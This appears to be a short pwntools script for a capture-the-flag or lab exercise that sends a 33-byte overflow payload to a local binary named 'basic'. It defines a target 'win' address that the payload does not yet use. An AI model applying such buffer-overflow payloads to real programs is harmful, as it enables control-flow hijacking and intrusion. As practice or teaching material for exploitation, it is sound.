#!/usr/bin/env python3
from pwn import *

# context.terminal = ['tmux','splitw','-h']
# context(os='windows',arch='arm',log_level='debug')

p = process("./basic")

offset = 32
winAddr = 0x08049233

payload = "A".encode() * offset + 'B'.encode()

p.sendline(payload)

p.interactive()

